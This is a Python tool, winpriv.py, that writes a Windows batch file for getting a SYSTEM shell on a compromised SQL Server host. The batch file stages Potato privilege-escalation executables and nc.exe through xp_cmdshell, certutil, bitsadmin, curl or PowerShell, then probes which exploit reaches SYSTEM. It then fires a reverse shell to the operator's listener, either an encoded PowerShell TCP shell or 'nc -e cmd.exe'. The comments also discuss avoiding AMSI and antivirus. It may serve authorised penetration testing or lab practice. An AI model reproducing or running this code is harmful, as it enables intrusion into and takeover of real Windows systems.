#!/usr/bin/env python3
"""winpriv.py -- your first SYSTEM shell in one paste (Route 1: Potato -> SYSTEM).

QUICKSTART:
    1. Put every Potato exe you have + nc.exe in one folder:
          mkdir -p ~/potatoes
          cp GodPotato-NET4.exe EfsPotato.exe SharpEfsPotato.exe nc.exe ~/potatoes/
    2. Start a listener:   nc -lvnp 443
    3. Serve the folder:   cd ~/potatoes && sudo python3 -m http.server 80
    4. Generate run.bat:   python3 winpriv.py --lhost YOUR_IP --potatoes ~/potatoes --fire > ~/potatoes/run.bat
    5. Paste in mssqlclient (or any xp_cmdshell channel):
          EXEC master..xp_cmdshell 'certutil -urlcache -f http://YOUR_IP/run.bat C:\\Windows\\Temp\\run.bat';
          EXEC master..xp_cmdshell 'C:\\Windows\\Temp\\run.bat';
    6. Watch your nc listener catch a SYSTEM shell.

WHAT IT DOES (all in the ONE batch you paste on target):
    STAGE  each Potato + nc.exe via certutil -> bitsadmin -> curl -> powershell,
           reporting [TRIED via X: exit=N bytes=M] per attempt so failed transports
           are visible. Size-guard rejects AV-nuked partial writes.
    SCAN   each staged Potato with a benign `whoami > marker` probe, hard-timeout
           any that hang (SweetPotato on hardened boxes is the classic hanger).
    FIRE   (--fire) run the SYSTEM revshell via the first Potato that won SYSTEM.
           Uses nc.exe when nc.exe is in your --potatoes folder (quiet, no AMSI in
           the callback); otherwise a powershell revshell.
    SUMMARY   what staged, what won, what fired.

BEGINNER FLAGS (usually all you need):
    --lhost <ip>       your listener IP        (required for --fire)
    --lport <n>        your listener port      (default: 443)
    --potatoes <dir>   folder with Potato exes (default: .)
    --fire             actually fire the revshell after the scan (default: stage+scan only)

ADVANCED FLAGS (documented in ../CHEATSHEET.md):
    --transport certutil|bitsadmin|curl|powershell   preferred transport (default: certutil)
    --verbose          strip >nul redirects so failures print their real errors
    --revtype nc|powershell   force a callback type (default: auto-detect from nc.exe presence)
    --nc-path <path>   target-side nc.exe path if not %STAGE%\\nc.exe
    --stagedir <path>  target-side landing dir (default: %STAGE% from _winpriv_common.py)
    --serve-url <url>  http://x:PORT if not serving on 80
    --timeout <n>      per-probe hard-kill seconds (default: 6)
    --include-rogue    also probe RoguePotato (needs socat 135->target:9999 on your box)
    --no-stage         skip stage phase (assume already on target)
    --no-scan          stage only, don't probe
    TOOL1 TOOL2 ...    restrict the batch to specific Potato exes

WHEN THIS ISN'T ENOUGH:
    Egress-blocked target?      -> gen_nonet.py (fully fileless via chunked b64)
    Need in-memory-only load?   -> gen_full.py  (HTTP cradle + reflective load)
    Otherwise this is the path — gen_full/gen_forma/gen_nonet all edit TOOL in
    _winpriv_common.py; this handles the whole route without touching config files.
"""
import os
import sys
import _winpriv_common as P

_a = sys.argv[1:]

_FLAGS_WITH_ARG = {
    "--stagedir", "--timeout", "--serve-dir", "--serve-url", "--potatoes",
    "--transport", "--revtype", "--lhost", "--lport", "--nc-path",
}
_VALID_TRANSPORTS = ("certutil", "bitsadmin", "curl", "powershell")


def _opt(name, default=None, is_flag=False):
    if is_flag:
        return name in _a
    if name in _a:
        i = _a.index(name)
        return _a[i + 1] if i + 1 < len(_a) else default
    return default


# --- config resolution: CLI flag > _winpriv_common.py > sensible default ---------

STAGE = (_opt("--stagedir") or P.STAGE).rstrip("\\")
# --potatoes is the beginner-friendly alias for --serve-dir (either wins over the default).
SERVE_DIR = os.path.abspath(_opt("--potatoes") or _opt("--serve-dir") or ".")
SERVE_URL = (_opt("--serve-url") or f"http://{P.LHOST}").rstrip("/")
INCLUDE_ROGUE = _opt("--include-rogue", is_flag=True)
NO_STAGE = _opt("--no-stage", is_flag=True)
NO_SCAN = _opt("--no-scan", is_flag=True)
FIRE = _opt("--fire", is_flag=True)
VERBOSE = _opt("--verbose", is_flag=True)
LHOST = _opt("--lhost") or P.LHOST
try:
    LPORT = int(_opt("--lport") or P.LPORT)
except (TypeError, ValueError):
    LPORT = P.LPORT
NC_PATH = _opt("--nc-path") or f"{STAGE}\\nc.exe"
try:
    TIMEOUT = int(_opt("--timeout") or 6)
except (TypeError, ValueError):
    TIMEOUT = 6
# --revtype: if the operator didn't say, auto-pick nc when nc.exe is in --potatoes
# (a native callback avoids AMSI in the revshell path -- the classic gen_full failure);
# else fall back to _winpriv_common.REVTYPE. Resolved AFTER LOCAL_NC discovery below.
_REVTYPE_EXPLICIT = _opt("--revtype")

# transport preference: pass --transport X to try X FIRST, others fall back after.
_pref = _opt("--transport")
if _pref and _pref in _VALID_TRANSPORTS:
    TRANSPORT_ORDER = [_pref] + [t for t in _VALID_TRANSPORTS if t != _pref]
else:
    TRANSPORT_ORDER = list(_VALID_TRANSPORTS)   # default: certutil first

# Positional args = restrict to these tools; empty = every applicable to the mode.
_pos, _skip = [], False
for a in _a:
    if _skip:
        _skip = False
        continue
    if a in _FLAGS_WITH_ARG:
        _skip = True
        continue
    if a.startswith("--"):
        continue
    _pos.append(a)

# --- payload construction for --fire --------------------------------------------

def _ps_revshell_b64(lhost: str, lport: int) -> str:
    """Encoded UTF-16LE base64 for `powershell -e` -- the same revshell shape
    _winpriv_common._revshell() uses, but with our CLI overrides for host/port."""
    import base64
    ps = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
    )
    return base64.b64encode(ps.encode("utf-16-le")).decode()


# --- discover locally-staged Potato exes ----------------------------------------

_canon = {k.lower(): k for k in P.POTATOES_CMDLINE}
LOCAL_TOOLS: dict = {}     # canonical Potato name -> local basename (case preserved)
LOCAL_NC = ""              # local basename of nc.exe if present (empty otherwise)

if os.path.isdir(SERVE_DIR):
    for fn in os.listdir(SERVE_DIR):
        fp = os.path.join(SERVE_DIR, fn)
        if not os.path.isfile(fp):
            continue
        canon = _canon.get(fn.lower())
        if canon:
            LOCAL_TOOLS[canon] = fn
        elif fn.lower() == "nc.exe":
            LOCAL_NC = fn

# Auto-detect revshell type: explicit --revtype wins; else nc when nc.exe is on
# hand (native callback = no AMSI in the callback path); else module default.
if _REVTYPE_EXPLICIT:
    REVTYPE = _REVTYPE_EXPLICIT
elif LOCAL_NC:
    REVTYPE = "nc"
else:
    REVTYPE = P.REVTYPE

# Build the fire payload with the resolved REVTYPE.
if REVTYPE == "nc":
    FIRE_PAYLOAD = f"cmd.exe /c {NC_PATH} {LHOST} {LPORT} -e cmd.exe"
else:
    FIRE_PAYLOAD = f"powershell -e {_ps_revshell_b64(LHOST, LPORT)}"

# Which Potatoes go into the emitted batch:
if NO_STAGE:
    tools = _pos or list(P.POTATOES_CMDLINE)
    tools = [t for t in tools if t in P.POTATOES_CMDLINE]
else:
    tools = list(LOCAL_TOOLS)
    if _pos:
        tools = [t for t in tools if t in _pos]

if not INCLUDE_ROGUE:
    tools = [t for t in tools if t != "RoguePotato.exe"]


# --- helpers --------------------------------------------------------------------


def _short(tool: str) -> str:
    """Compact per-tool tag for the marker filename + batch goto label. Keeps
    version digits so the three GodPotato-NET{2,35,4} builds don't collide."""
    return tool.replace(".exe", "").replace("-", "").lower()


def _quiet_tail() -> str:
    """`>nul 2>&1` in default mode, empty in --verbose (let stderr surface)."""
    return "" if VERBOSE else ">nul 2>&1"


# --- transport attempt emitter ---------------------------------------------------


def _stage_attempt(transport: str, url_basename: str, target: str) -> list[str]:
    """One transport attempt for one file: cleanup, invoke, size-verify.
    Emits a `[TRIED via X: exit=Y bytes=Z]` line so operators see the full chain
    (not just the winner) and can distinguish 'AV nuked it' (size=0, exit=0) from
    'transport blocked' (size=0, exit!=0)."""
    q = _quiet_tail()
    if transport == "certutil":
        cmd = f'certutil -urlcache -f %BASE%/{url_basename} "{target}" {q}'
    elif transport == "bitsadmin":
        cmd = f'bitsadmin /transfer j%RANDOM% %BASE%/{url_basename} "{target}" {q}'
    elif transport == "curl":
        cmd = f'where curl >nul 2>&1 && curl -so "{target}" %BASE%/{url_basename} {q}'
    elif transport == "powershell":
        cmd = (f'powershell -c "(New-Object Net.WebClient).DownloadFile('
               f"'%BASE%/{url_basename}','{target}')\" {q}")
    else:
        return []
    return [
        f'del "{target}" 2>nul',
        cmd,
        "set EC=%errorlevel%",
        f'call :size "{target}"',
        f'echo   [TRIED via {transport}: exit=!EC! bytes=!SIZE!]',
    ]


def _stage_block(tool: str, url_basename: str, target_basename: str) -> list[str]:
    """Full stage block for one tool: try every transport in preference order,
    stop at the first that verified (size >= 1024). Emits [STAGED via X] on success
    or [FAILED after every transport] with a summary line."""
    target = f"%STAGE%\\{target_basename}"
    tag = _short(tool)
    lines = [
        f"echo --- STAGE {tool} ---",
    ]
    for tr in TRANSPORT_ORDER:
        lines += _stage_attempt(tr, url_basename, target)
        lines.append(
            f"if !SIZE! GEQ 1024 (echo   [STAGED via {tr} !SIZE!B] "
            f"& set STAGED=!STAGED! {tool} & goto :after_stage_{tag})")
    # every transport failed
    lines += [
        "echo   [FAILED after every transport -- exe is likely AV-signatured on this box]",
        "echo          (--verbose shows each transport's error output)",
        f":after_stage_{tag}",
    ]
    return lines


def _scan_block(tool: str, target_basename: str) -> list[str]:
    """Probe attempt: fire the Potato with `cmd /c whoami > marker`, sleep TIMEOUT,
    hard-taskkill any hang, classify from the marker file. Uses POTATOES_CMDLINE
    verbatim so a WIN here = gen_full/forma/nonet will work with the same TOOL."""
    marker = f"{STAGE}\\pscan_{_short(tool)}.txt"
    tmpl = P.POTATOES_CMDLINE[tool]
    probe = f"cmd.exe /c whoami>{marker}"
    invoke = tmpl.replace("{CMD}", probe).replace("{LHOST}", LHOST)
    tag = _short(tool)
    return [
        f'if not exist "%STAGE%\\{target_basename}" '
        f"(echo --- SCAN {tool} : not in %STAGE%, skip --- & goto :after_scan_{tag})",
        f"echo --- SCAN {tool} ---",
        f'del "{marker}" 2>nul',
        f'start /b "" "%STAGE%\\{target_basename}" {invoke} >nul 2>nul',
        f"ping -n {TIMEOUT + 1} 127.0.0.1 >nul",
        f'taskkill /f /im "{target_basename}" >nul 2>nul',
        f'if exist "{marker}" (',
        f'  findstr /i "system" "{marker}" >nul && '
        f'(echo   [+] {tool} WORKS -- SYSTEM confirmed & set WINNERS=!WINNERS! {tool}) || '
        f"(echo   [-] {tool} ran but no SYSTEM in marker)",
        ") else (",
        f"  echo   [-] {tool} no marker written (spawn failed / hung / access denied)",
        ")",
        f":after_scan_{tag}",
    ]


def _fire_block(tool: str, target_basename: str) -> list[str]:
    """Fire block for one Potato -- only runs when !FIRST! (the picked winner)
    matches. Emitted for every staged Potato; exactly one fires at runtime."""
    tmpl = P.POTATOES_CMDLINE[tool]
    invoke = tmpl.replace("{CMD}", FIRE_PAYLOAD).replace("{LHOST}", LHOST)
    return [
        f'if /I "!FIRST!"=="{tool}" (',
        f'  echo   firing !FIRST! -- SYSTEM revshell to {LHOST}:{LPORT} '
        f"({'nc' if REVTYPE == 'nc' else 'powershell'} callback)",
        f'  "%STAGE%\\{target_basename}" {invoke}',
        f")",
    ]


# --- emit -----------------------------------------------------------------------


header = [
    "@REM -----------------------------------------------------------------------",
    "@REM  Skoll Potato stage + scan" + ("  +  fire" if FIRE else "") + "  --  one paste, end to end.",
    f"@REM    on attacker (in {SERVE_DIR}): sudo python3 -m http.server 80",
    f"@REM    on target: EXEC master..xp_cmdshell 'certutil -urlcache -f {SERVE_URL}/pscan.bat {STAGE}\\pscan.bat';",
    f"@REM               EXEC master..xp_cmdshell '{STAGE}\\pscan.bat';",
    f"@REM  transport order: {' -> '.join(TRANSPORT_ORDER)}   (--transport <name> to change)",
]
if NO_STAGE:
    header.append("@REM  --no-stage: skipping stage phase (Potatoes assumed already in %STAGE%).")
elif LOCAL_TOOLS or LOCAL_NC:
    if LOCAL_TOOLS:
        header.append(f"@REM  found {len(LOCAL_TOOLS)} local Potato exe(s) in {SERVE_DIR}:")
        for canon, base in LOCAL_TOOLS.items():
            note = f"  ({canon})" if base != canon else ""
            header.append(f"@REM     - {base}{note}")
    if LOCAL_NC and REVTYPE == "nc":
        header.append(f"@REM  found nc.exe -- will stage it too (revtype=nc)")
    elif REVTYPE == "nc" and not LOCAL_NC:
        header.append(f"@REM  revtype=nc but no nc.exe in {SERVE_DIR}; "
                      f"assuming {NC_PATH} exists on target already")
else:
    header.append(
        f"@REM  WARNING: no known Potato exes in {SERVE_DIR}. Drop them there and re-run,")
    header.append("@REM  or pass --no-stage if they are already on the target.")
if _pos:
    header.append(f"@REM  restricted to: {' '.join(_pos)}")
if FIRE:
    header.append(f"@REM  --fire: winner will be fired with a {REVTYPE} revshell "
                  f"to {LHOST}:{LPORT}. START YOUR LISTENER FIRST.")
header.append("@REM -----------------------------------------------------------------------")

body: list[str] = [
    "@echo off",
    "setlocal enabledelayedexpansion",
    f"set STAGE={STAGE}",
    f"set BASE={SERVE_URL}",
    "set STAGED=",
    "set WINNERS=",
    "set FIRST=",
    "set EC=0",
    "set SIZE=0",
    "echo === Skoll Potato ===",
]

# STAGE phase -- include nc.exe too when firing an nc revshell and we have a local copy.
if not NO_STAGE and (tools or (FIRE and REVTYPE == "nc" and LOCAL_NC)):
    body += ["echo.", "echo === STAGE ==="]
    if FIRE and REVTYPE == "nc" and LOCAL_NC:
        body += _stage_block("nc.exe", LOCAL_NC, LOCAL_NC)   # canonical name = local name
    for tool in tools:
        body += _stage_block(tool, LOCAL_TOOLS[tool], LOCAL_TOOLS[tool])

# SCAN phase.
if not NO_SCAN and tools:
    body += ["echo.", "echo === SCAN ==="]
    for tool in tools:
        target_base = LOCAL_TOOLS.get(tool, tool)
        body += _scan_block(tool, target_base)

# FIRE phase -- pick first winner and run the revshell via that Potato.
if FIRE:
    body += [
        "echo.",
        "echo === FIRE ===",
        'if "!WINNERS!"=="" (echo   NO winner to fire. Nothing more to do here.) '
        'else (for /f "tokens=1" %%W in ("!WINNERS!") do set FIRST=%%W)',
    ]
    if not tools:
        body.append("echo   (no staged Potatoes to fire)")
    for tool in tools:
        target_base = LOCAL_TOOLS.get(tool, tool)
        body += _fire_block(tool, target_base)

# Summary.
body += ["echo.", "echo === summary ==="]
if not NO_STAGE:
    body.append(
        'if "!STAGED!"=="" (echo   NO Potatoes staged. '
        'Check attacker HTTP is up + serve-dir has exes; '
        'if the target already has them, re-run with --no-stage.) '
        'else (echo   Staged:!STAGED!)')
if not NO_SCAN:
    body.append(
        'if "!WINNERS!"=="" (echo   NO Potato won SYSTEM. '
        'Try LocalPotato ^(file-write^) or a non-Potato route ^(SeBackup/BYOVD/service-misconfig^).) '
        'else (echo   Winner^(s^):!WINNERS!' +
        ("  -- fired above." if FIRE else
         "  -- set TOOL to one of these in _winpriv_common.py and re-run gen_full/gen_forma/gen_nonet.") +
        ')')
body += ["goto :eof", "", ":size",
         "REM subroutine: set !SIZE! from a file arg (0 if missing).",
         "set SIZE=0",
         "if exist %~1 for %%A in (%~1) do set SIZE=%%~zA",
         "exit /b"]

# stderr warnings -----------------------------------------------------------------

if not NO_STAGE and not LOCAL_TOOLS:
    sys.stderr.write(
        f"warning: no known Potato exes in --serve-dir {SERVE_DIR}\n"
        f"         expected any of: {', '.join(sorted(P.POTATOES_CMDLINE))}\n"
        f"         drop exes there and re-run, "
        f"or pass --no-stage to probe already-staged targets.\n")
if FIRE and REVTYPE == "nc" and NO_STAGE:
    sys.stderr.write(
        f"warning: --fire --revtype nc but --no-stage set -- "
        f"assumes {NC_PATH} exists on target.\n")
if FIRE and not (NO_SCAN or tools):
    sys.stderr.write("warning: --fire but --no-scan or no tools -- nothing will be fired.\n")

print("\r\n".join(header + body))
